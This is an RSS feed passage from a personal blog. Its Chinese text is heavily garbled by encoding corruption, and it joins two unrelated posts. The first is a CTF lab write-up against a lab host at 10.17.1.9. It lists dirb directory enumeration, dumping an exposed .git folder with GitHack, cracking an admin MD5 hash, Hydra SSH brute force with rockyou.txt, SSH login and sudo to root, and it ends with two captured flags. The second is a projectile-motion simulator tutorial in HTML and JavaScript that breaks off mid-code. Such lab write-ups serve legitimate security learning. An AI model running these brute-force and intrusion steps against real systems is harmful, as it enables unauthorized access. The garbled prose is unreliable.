&lt;h2&gt;‰∏Ä„ÄÅ ‰ΩúÊ•≠ÂÖßÂÆπËàáÁõÆÊ®ô Êâì‰∏ÄËôüÈù∂Ê©üÔºåÂèñÂæó Flag&lt;/h2&gt;
&lt;h2&gt;‰∫å„ÄÅÊ≠•È©ü&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;ÂÖàÁ¢∫Ë™çÊòØÂê¶ÊúâÈÄ£‰∏äÁ∂≤„ÄÇ 
&lt;code&gt;ping 10.17.1.9&lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/r19bnRCwC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;drib Ë©≤Á∂≤Á´ôÁôºÁèæ backend ÂèØ‰ª•ÁôªÂÖ•ÁöÑÂú∞‚ΩÖ„ÄÇ 
&lt;code&gt;dirb http://10.17.1.9:80&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Âà∞ GitHack Ë≥áÊñôÂ§æÔºåÂæåÁî® GitHack ÊääÁ∂≤Á´ôÊäì‰∏ã‰æÜ„ÄÇ 
&lt;code&gt;cd GitHack &lt;/code&gt;
&lt;code&gt;python GitHack.py http://10.17.1.9/backend/.git/&lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/SJ1OhRADR.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/B1HthA0wC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;cat index.php ÂæåÔºåÁôºÁèæ passwordÔºåÁî±Êñº‰∏ãÈù¢Á®ãÂºèÂ•óÁî® if($username==‚Äôadmin‚Äô~~~)ÔºåÊïÖÂæóÁü• admin ÁÇ∫ username„ÄÇ
&lt;img src=&quot;https://hackmd.io/_uploads/HkV3nC0PR.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Â∞á‰∏äÂúñÂèçÁôΩËôïÁöÑ‰∫ÇÁ¢ºË£ΩÊàê md5 Ê™îÔºåÊñπÂèØÈÄ≤Ë°åÂæåÁ∫åÁöÑÁàÜÁ†¥„ÄÇ&lt;br&gt;&lt;code&gt;cd echo &amp;#39;eb0a191797624dd3a48fa681d3061212&amp;#39; &amp;gt; admin.md5&lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/S1qypCAwC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÁÇ∫ÂæåÁ∫åÁàÜÁ†¥‰æøÂà©ÔºåÊ¨≤Â∞á wordlist Â≠óÂÖ∏‰∏≠ÁöÑ rockyou.txt Ê™îÊ°àË§áË£ΩËá≥‰∏äÂúñË™û admin.md5 Ê™îÊ°àÂêå‰∏ÄË≥áÊñôÂ§æÂÖß„ÄÇ
&lt;img src=&quot;https://hackmd.io/_uploads/BJv-TRADC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Áî±ÊñºÁàÜÁ†¥Êú™ÊûúÔºåËÄåÁî®Á∑ö‰∏äÂ∑•ÂÖ∑Ëß£Ê±∫ password ‰∫ÇÁ¢º„ÄÇÊúÄÁµÇÂæóÂá∫ÂØÜÁ¢ºÊòØ master„ÄÇ
&lt;img src=&quot;https://hackmd.io/_uploads/r13GaARwR.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/SyrmaA0DC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÁôªÂÖ•ÊàêÂäüÂæåÔºåÂ∞á‰∏äÊñπÁ∂≤ÂùÄ‰∏≠ÁöÑ hosts Êõ¥ÁÇ∫ passwd,Êñº‰∏ãÊñπÂèçÁôΩËôïÔºåÁôºÁèæ red ‰ΩøÁî®ËÄÖÂêçÁ®±ÁôªÂÖ•ÁèæË±°ËàáÁúæ‰∏çÂêå„ÄÇ
&lt;img src=&quot;https://hackmd.io/_uploads/HyANaC0vA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ryjrTACPA.png&quot; alt=&quot;image&quot;&gt;
9. Â∞á red ‰ΩøÁî®ËÄÖÂêçÁ®±ÈÄ≤Ë°åÁàÜÁ†¥1ÔºåÂØÜÁ¢ºÂú®‰∏ãÊñπÁ∂†Â≠óËôïÔºåÁÇ∫ victor„ÄÇ 
&lt;code&gt;hydra -l red -P rockyou.txt -t 64 -I ssh://10.17.1.9&lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/rJUspRCD0.png&quot; alt=&quot;image&quot;&gt;
10. Ê¨≤‰ΩøÁî® red ÈÄ≤Ë°åÁôªÂÖ•ÔºåËº∏ÂÖ•ÂØÜÁ¢ºÂæåÔºåÂ¶ÇÂúñÊâÄÁ§∫„ÄÇ 
&lt;code&gt;ssh red@10.17.1.9&lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/HyVaTR0DC.png&quot; alt=&quot;image&quot;&gt;
11. Á¢∫Ë™ç red ÁöÑÊ¨äÈôêÔºåÁÇ∫ALL
&lt;code&gt;sudo -i&lt;/code&gt;&lt;/p&gt;
&lt;ol start=&quot;12&quot;&gt;
&lt;li&gt;&lt;p&gt;ls ÂæåÁôºÁèæ local.txtÔºåcat local.txt ‰πãÂæåÔºåÁôºÁèæ flag ÁÇ∫ &lt;code&gt;AIS3_Junior{YouAreBruteForcer:D:D:D:D:D}&lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/r1U-RCRvC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ÁµÇ‰∫ÜÔºåÁÑ∂ÔºåÈùû‰πü„ÄÇ‰ªçÊúâ flag Â∞öÊú™Â∞ãÁç≤ÔºåËÆäË∫´ÁÇ∫ÁÆ°ÁêÜÂì°Ë∫´‰ªΩÂæåÔºåÁôºÁèæÈÇÑÊúâ‰∏ÄÂÄã flag ÁÇ∫: &lt;code&gt;AIS3\_Junior{First\_PenTestXDDDDDDD}&lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/SJSmRC0wA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Wed, 16 Aug 2023 16:00:00 GMT</pubDate></item><item><title>ÈûãÊããÁ∂≤È†ÅË£Ω‰Ωú</title><link>https://yih-0118.github.io/blog/%E9%9E%8B%E6%8B%8B%E7%B6%B2%E9%A0%81%E8%A3%BD%E4%BD%9C/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/%E9%9E%8B%E6%8B%8B%E7%B6%B2%E9%A0%81%E8%A3%BD%E4%BD%9C/</guid><description>È´ò‰∏ÄËá™‰∏ªÂ≠∏Áøí</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/%E9%9E%8B%E6%8B%8B%E7%B6%B2%E9%A0%81%E8%A3%BD%E4%BD%9C/&quot;&gt;https://yih-0118.github.io/blog/%E9%9E%8B%E6%8B%8B%E7%B6%B2%E9%A0%81%E8%A3%BD%E4%BD%9C/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;&lt;a href=&quot;https://github.com/yih-0118/physic.github.io&quot;&gt;GithubÈÄ£Áµê&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ÊñúÊããÂØ¶È©óÊ®°Êì¨&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://yih-0118.github.io/physic.github.io/Projectile%20Motion%20Simulation%20pr1/&quot;&gt;part1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://yih-0118.github.io/physic.github.io/Projectile%20Motion%20Simulation%20pr2/&quot;&gt;part2&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Part 1. ‰∏çËÄÉÊÖÆÁ©∫Ê∞£ÈòªÂäõ&lt;/h1&gt;
&lt;h2&gt;ÂàùÂßãÁâ©ÁêÜÈáè&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ÈáçÂäõÂä†ÈÄüÂ∫¶ $(g)$ &lt;/li&gt;
&lt;li&gt;ÂàùÈÄüÂ∫¶ ($v_0$)&lt;/li&gt;
&lt;li&gt;ÊäïÊì≤ËßíÂ∫¶ ($\theta$)&lt;/li&gt;
&lt;li&gt;Ëµ∑Âßã‰ΩçÁΩÆ ($x_0$, $y_0$)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;ÂÖ¨Âºè&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Ê∞¥Âπ≥ÊñπÂêëÈÄüÂ∫¶Ôºö $v_x$ $_0$ $=v_0$ $\cos\theta$&lt;/li&gt;
&lt;li&gt;ÂûÇÁõ¥ÊñπÂêëÈÄüÂ∫¶Ôºö $v_y$ $_0$ $=v_0$ $\sin\theta$&lt;/li&gt;
&lt;li&gt;È£õË°åÊôÇÈñìÔºö $\frac{2  vy_0}{g}$ $ = $ $\frac{2  v_0\sin\theta}{g}$ &lt;/li&gt;
&lt;li&gt;Ê∞¥Âπ≥‰ΩçÁΩÆÈö®ÊôÇÈñìÁöÑËÆäÂåñÔºö$\ x$ $=$ $x_0+v_x$ $_0$ $\times$ $t$&lt;/li&gt;
&lt;li&gt;ÈâõÁõ¥‰ΩçÁΩÆÈö®ÊôÇÈñìÁöÑËÆäÂåñÔºö&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Áï∂ÊäïÊì≤ËßíÂ∫¶‰ªãÊñº0~90Â∫¶ÊôÇÔºö$\ y$ $=$ $y_0$ $+v_y$ $_0 \times t$ $-$ $\cfrac{1}{2}$ $gt^2$&lt;/li&gt;
&lt;li&gt;Áï∂ÊäïÊì≤ËßíÂ∫¶‰ªãÊñº0~-90Â∫¶ÊôÇÔºö$\ y$ $=$ $y_0$ $+v_y$ $_0 \times t$ $+$ $\cfrac{1}{2}$ $gt^2$&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;HTML &amp;amp; Javascript ÈõõÂΩ¢&lt;/h2&gt;
&lt;h3&gt;HTML&lt;/h3&gt;
&lt;h4&gt;&lt;strong&gt;Ëº∏ÂÖ•ÂÄºÔºö&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;ÈáçÂäõÂä†ÈÄüÂ∫¶ $(g)$&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div&amp;gt;
        &amp;lt;label for=&amp;quot;Gravity&amp;quot;&amp;gt;Gravity :&amp;lt;/label&amp;gt;
        &amp;lt;input type=&amp;quot;number&amp;quot; id=&amp;quot;Gravity&amp;quot; step=&amp;quot;9.8&amp;quot; min=&amp;quot;0&amp;quot;&amp;gt;
      &amp;lt;/div&amp;gt;
&amp;lt;div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;ÂàùÈÄüÂ∫¶ ($v_0$)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div&amp;gt;
      &amp;lt;label for=&amp;quot;initial-velocity&amp;quot;&amp;gt;Initial Velocity:   &amp;lt;select id=&amp;quot;velocity-unit&amp;quot;&amp;gt;
        &amp;lt;option value=&amp;quot;m/s&amp;quot;&amp;gt; m/s&amp;lt;/option&amp;gt;
        &amp;lt;option value=&amp;quot;km/h&amp;quot;&amp;gt; km/h&amp;lt;/option&amp;gt;
        &amp;lt;option value=&amp;quot;mph&amp;quot;&amp;gt; mph&amp;lt;/option&amp;gt;&amp;lt;/label&amp;gt;//‰æøÊñºÂàáÊèõÂñÆ‰Ωç
      &amp;lt;input type=&amp;quot;number&amp;quot; id=&amp;quot;initial-velocity&amp;quot; step=&amp;quot;0.1&amp;quot; min=&amp;quot;0&amp;quot;&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;ÊäïÊì≤ËßíÂ∫¶ ($\theta$)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div&amp;gt;
      &amp;lt;label for=&amp;quot;launch-angle&amp;quot;&amp;gt;Launch Angle (deg):&amp;lt;/label&amp;gt;
      &amp;lt;input type=&amp;quot;number&amp;quot; id=&amp;quot;launch-angle&amp;quot; step=&amp;quot;1&amp;quot; min=&amp;quot;0&amp;quot; max=&amp;quot;360&amp;quot;&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Ëµ∑Âßã‰ΩçÁΩÆ ($x_0$, $y_0$)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div&amp;gt;
      &amp;lt;label for=&amp;quot;initial-position&amp;quot;&amp;gt;Initial Position (x0):&amp;lt;/label&amp;gt;
      &amp;lt;input type=&amp;quot;number&amp;quot; id=&amp;quot;initial-position&amp;quot; step=&amp;quot;0.1&amp;quot; min=&amp;quot;0&amp;quot;&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;div&amp;gt;
      &amp;lt;label for=&amp;quot;initial-height&amp;quot;&amp;gt;Initial Height (y0):&amp;lt;/label&amp;gt;
      &amp;lt;input type=&amp;quot;number&amp;quot; id=&amp;quot;initial-height&amp;quot; step=&amp;quot;0.1&amp;quot; min=&amp;quot;0&amp;quot;&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ÁõÆÂâçÊïàÊûúÔºö&lt;/h4&gt;
&lt;h2&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJwYueVfT.png&quot; alt=&quot;&quot;&gt;&lt;/h2&gt;
&lt;h3&gt;Javacript&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Â∞ãÊâæÂÖÉÁ¥†ÂÄº (getElementById)ÔºåËàáËÉåÊôØË®àÁÆóË®≠ÂÆö&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;document.getElementById(&amp;#39;plot-button&amp;#39;).addEventListener(&amp;#39;click&amp;#39;, function() {
      var v0 = parseFloat(document.getElementById(&amp;#39;initial-velocity&amp;#39;).value);
      const gravity = parseFloat(document.getElementById(&amp;#39;Gravity&amp;#39;).value);//Âõ†ÁÇ∫ÈáçÂäõÊâÄ‰ª•Áî®const
      var pi = 3.14159265359;//ÂïèÂ∞±ÊòØjsÂÖßÂª∫ÊòØÁî®rad
...Á≠âÁ≠âÁ≠âÁ≠âÔΩû
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;degËΩârad&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var ?? = ?? * Math.cos(theta * pi / 180.0);~~~
...Á≠âÁ≠âÁ≠âÁ≠âÔΩû
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Â∏∂ÂÖ•Áâ©ÁêÜÂÖ¨ÂºèÔΩûÔΩûÔΩû&lt;/li&gt;
&lt;li&gt;Êé®ÂÖ•ÊØèÂÄãÊôÇÈñìÈªûÔΩûÔΩûÔΩû&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;plotly.js&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ÊàëË¶∫ÂæóÂæàÂÉè pythonÁöÑmatplotlib as pltÔºüÔºü&lt;/li&gt;
&lt;li&gt;Êé®ÂÖ•Ë≥áÊñô&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var x_data = [];
var y_data = [];
x_data.push(x);
y_data.push(y);
    //Â∏∂ÂÖ•Â∞éÂÆåÂæåÁöÑÁâ©ÁêÜÂÖ¨Âºè„ÄÇË¶ÅpushÂ∞çÊù±Ë•ø
    //ÂÖ∂ÂØ¶‰∏≠ÈñìÁúÅÁï•‰∏ÄÂ§ßÂ†Ü„Ñ°
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ÁõÆÂâçÊïàÊûúÔºö&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJNTEbNGT.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;CSSÁæéÂåñÂæå&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJbNIWNG6.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;Poltly.js vs Python Matplotlib&lt;/h2&gt;
&lt;p&gt;ÂèÉÊï∏ÂÄºÔºö&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;initial_velocity = 50&lt;/li&gt;
&lt;li&gt;velocity_unit = &amp;#39;m/s&amp;#39;&lt;/li&gt;
&lt;li&gt;launch_angle = 39&lt;/li&gt;
&lt;li&gt;gravity = 9.8&lt;/li&gt;
&lt;li&gt;initial_position = 20&lt;/li&gt;
&lt;li&gt;initial_height = 10&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;1. Plotly.js&lt;/strong&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/rJvzObNf6.png&quot; alt=&quot;&quot;&gt;
&lt;strong&gt;2. Python Matplotlib&lt;/strong&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/BJq7uZ4fT.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;Part 2. ËÄÉÊÖÆÁ©∫Ê∞£ÈòªÂäõÔºå‰ΩÜ‰∏çÊé¢Á©∂Áâ©È´îÊóãËΩâ&lt;/h1&gt;
&lt;h2&gt;ÂàùÂßãÁâ©ÁêÜÈáè&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ÈáçÂäõÂä†ÈÄüÂ∫¶$(g)$&lt;/li&gt;
&lt;li&gt;ÂàùÈÄüÂ∫¶ ($v_0$)&lt;/li&gt;
&lt;li&gt;ÊäïÊì≤ËßíÂ∫¶ ($\theta$)&lt;/li&gt;
&lt;li&gt;Ëµ∑Âßã‰ΩçÁΩÆ ($x_0$, $y_0$)&lt;/li&gt;
&lt;li&gt;Ë≥™Èáè $(kg)$&lt;/li&gt;
&lt;li&gt;ÂèóÈòªÈù¢Á©ç $(m^2)$&lt;/li&gt;
&lt;li&gt;Á©∫Ê∞£ÂØÜÂ∫¶ $(\frac{kg}{m^3})$&lt;/li&gt;
&lt;li&gt;ÈòªÂäõ‰øÇÊï∏ $(C_d,C_x)$&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;ÂÖ¨Âºè&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Ê∞¥Âπ≥ÊñπÂêëÈÄüÂ∫¶Ôºö $v_x$ $_0$ $=v_0$ $\cos\theta$&lt;/li&gt;
&lt;li&gt;ÂûÇÁõ¥ÊñπÂêëÈÄüÂ∫¶Ôºö $v_y$ $_0$ $=v_0$ $\sin\theta$&lt;/li&gt;
&lt;li&gt;È£õË°åÊôÇÈñìÔºö $\frac{2  vy_0}{g}$ $=$ $\frac{2  v_0\sin\theta}{g}$ $,$ $\frac{2 \cdot vy_0 + \sqrt{4 \cdot vy_0^2 + 8 \cdot g \cdot y_0}}{2 \cdot g}$ &lt;/li&gt;
&lt;li&gt;Ê∞¥Âπ≥‰ΩçÁΩÆÈö®ÊôÇÈñìÁöÑËÆäÂåñÔºö$\Delta x$ $=$ $x_0+v_x$ $_0$ $\times$ $t$&lt;/li&gt;
&lt;li&gt;ÈâõÁõ¥‰ΩçÁΩÆÈö®ÊôÇÈñìÁöÑËÆäÂåñÔºö&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Áï∂ÊäïÊì≤ËßíÂ∫¶‰ªãÊñº0~90Â∫¶ÊôÇÔºö$\Delta y$ $=$ $y_0$ $+v_y$ $_0 \times t$ $-$ $\cfrac{1}{2}$ $gt^2$&lt;/li&gt;
&lt;li&gt;Áï∂ÊäïÊì≤ËßíÂ∫¶‰ªãÊñº0~-90Â∫¶ÊôÇÔºö$\Delta y$ $=$ $y_0$ $+v_y$ $_0 \times t$ $+$ $\cfrac{1}{2}$ $gt^2$&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;6&quot;&gt;
&lt;li&gt;ÈòªÂäõÂÖ¨ÂºèÔºö$F_D=$ $\frac{1}{2}$ $pv^2C_dA$&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;$p:$ Á©∫Ê∞£ÂØÜÂ∫¶($\frac{kg}{m^3}$)&lt;/li&gt;
&lt;li&gt;$A:$ Êé•Ëß∏Èù¢Á©ç($m^2$)&lt;/li&gt;
&lt;li&gt;$C_d:$ ÈòªÂäõ‰øÇÊï∏&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;7&quot;&gt;
&lt;li&gt;Ê∞¥Âπ≥ÊñπÂêëÈòªÂäõÔºö$Fx = \frac{F_D  v_x0}{\sqrt{vx0^2 + vy0^2}}$&lt;/li&gt;
&lt;li&gt;ÂûÇÁõ¥ÊñπÂêëÈòªÂäõÔºö$Fy = \frac{F_D  v_y0}{\sqrt{vx0^2 + vy0^2}}$&lt;/li&gt;
&lt;li&gt;Ê∞¥Âπ≥ÊñπÂêëÈòªÂäõÂä†ÈÄüÂ∫¶Ôºö$a_x=$ $\frac{F_x}{m}$ $=$ $\frac{\frac{F_D  v_x0}{\sqrt{vx0^2 + vy0^2}}}{m}$&lt;/li&gt;
&lt;li&gt;ÂûÇÁõ¥ÊñπÂêëÈòªÂäõÂä†ÈÄüÂ∫¶Ôºö$a_y=$ $\frac{F_y}{m}-g$ $=$ $\frac{\frac{F_D  v_y0}{\sqrt{vx0^2 + vy0^2}}}{m}-g$&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;HTML &amp;amp; Javascript ÈõõÂΩ¢&lt;/h2&gt;
&lt;h3&gt;HTML&lt;/h3&gt;
&lt;h4&gt;&lt;strong&gt;Ëº∏ÂÖ•ÂÄºÔºö&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;ÈáçÂäõÂä†ÈÄüÂ∫¶$(g)$&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div&amp;gt;
        &amp;lt;label for=&amp;quot;Gravity&amp;quot;&amp;gt;Gravity :&amp;lt;/label&amp;gt;
        &amp;lt;input type=&amp;quot;number&amp;quot; id=&amp;quot;Gravity&amp;quot; step=&amp;quot;9.8&amp;quot; min=&amp;quot;0&amp;quot;&amp;gt;
      &amp;lt;/div&amp;gt;
&amp;lt;div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;ÂàùÈÄüÂ∫¶ ($v_0$)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div&amp;gt;
      &amp;lt;label for=&amp;quot;initial-velocity&amp;quot;&amp;gt;Initial Velocity:   &amp;lt;select id=&amp;quot;velocity-unit&amp;quot;&amp;gt;
        &amp;lt;option value=&amp;quot;m/s&amp;quot;&amp;gt; m/s&amp;lt;/option&amp;gt;
        &amp;lt;option value=&amp;quot;km/h&amp;quot;&amp;gt; km/h&amp;lt;/option&amp;gt;
        &amp;lt;option value=&amp;quot;mph&amp;quot;&amp;gt; mph&amp;lt;/option&amp;gt;&amp;lt;/label&amp;gt;//‰æøÊñºÂàáÊèõÂñÆ‰Ωç
      &amp;lt;input type=&amp;quot;number&amp;quot; id=&amp;quot;initial-velocity&amp;quot; step=&amp;quot;0.1&amp;quot; min=&amp;quot;0&amp;quot;&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;ÊäïÊì≤ËßíÂ∫¶ ($\theta$)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div&amp;gt;
      &amp;lt;label for=&amp;quot;launch-angle&amp;quot;&amp;gt;Launch Angle (deg):&amp;lt;/label&amp;gt;
      &amp;lt;input type=&amp;quot;number&amp;quot; id=&amp;quot;launch-angle&amp;quot; step=&amp;quot;1&amp;quot; min=&amp;quot;0&amp;quot; max=&amp;quot;360&amp;quot;&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Ëµ∑Âßã‰ΩçÁΩÆ ($x_0$, $y_0$)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div&amp;gt;
      &amp;lt;label for=&amp;quot;initial-position&amp;quot;&amp;gt;Initial Position (x0):&amp;lt;/label&amp;gt;
      &amp;lt;input type=&amp;quot;number&amp;quot; id=&amp;quot;initial-position&amp;quot; step=&amp;quot;0.1&amp;quot; min=&amp;quot;0&amp;quot;&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;div&amp;gt;
      &amp;lt;label for=&amp;quot;initial-height&amp;quot;&amp;gt;Initial Height (y0):&amp;lt;/label&amp;gt;
      &amp;lt;input type=&amp;quot;number&amp;quot; id=&amp;quot;initial-height&amp;quot; step=&amp;quot;0.1&amp;quot; min=&amp;quot;0&amp;quot;&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Ë≥™Èáè $(kg)$&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div&amp;gt;
  &amp;lt;label for=&amp;quot;mass&amp;quot;&amp;gt;Object Mass (kg):&amp;lt;/label&amp;gt;
  &amp;lt;input type=&amp;quot;number&amp;quot; id=&amp;quot;mass&amp;quot; step=&amp;quot;0.1&amp;quot; min=&amp;quot;0&amp;quot;&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;ÂèóÈòªÈù¢Á©ç $(m^2)$&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div&amp;gt;
  &amp;lt;label for=&amp;quot;cross-sectional-area&amp;quot;&amp;gt;Contact area (m^2):&amp;lt;/label&amp;gt;
  &amp;lt;input type=&amp;quot;number&amp;quot; id=&amp;quot;cross-sectional-area&amp;quot; step=&amp;quot;0.01&amp;quot; min=&amp;quot;0&amp;quot;&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Á©∫Ê∞£ÂØÜÂ∫¶ $(\frac{kg}{m^3})$&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div&amp;gt;
  &amp;lt;label for=&amp;quot;air-density&amp;quot;&amp;gt;Air Density (kg/m^3):&amp;lt;/label&amp;gt;
  &amp;lt;input type=&amp;quot;number&amp;quot; id=&amp;quot;air-density&amp;quot; step=&amp;quot;0.001&amp;quot; min=&amp;quot;0&amp;quot;&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;ÈòªÂäõ‰øÇÊï∏ $(C_d,C_x)$&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div&amp;gt;
  &amp;lt;label for=&amp;quot;drag-coefficient&amp;quot;&amp;gt;Drag Coefficient (Cd):&amp;lt;/label&amp;gt;
  &amp;lt;input type=&amp;quot;number&amp;quot; id=&amp;quot;drag-coefficient&amp;quot; step=&amp;quot;0.01&amp;quot; min=&amp;quot;0&amp;quot;&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ÁõÆÂâçÊïàÊûúÔºö&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJxpQoNMa.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;Javacript&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Â∞ãÊâæÂÖÉÁ¥†ÂÄº (getElementById)ÔºåËàáËÉåÊôØË®àÁÆóË®≠ÂÆö&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;document.getElementById(&amp;#39;plot-button&amp;#39;).addEventListener(&amp;#39;click&amp;#39;, function() {
      var v0 = parseFloat(document.getElementById(&amp;#39;initial-velocity&amp;#39;).value);
      const gravity = parseFloat(document.getElementById(&amp;#39;Gravity&amp;#39;).value);//Âõ†ÁÇ∫ÈáçÂäõÊâÄ‰ª•Áî®const
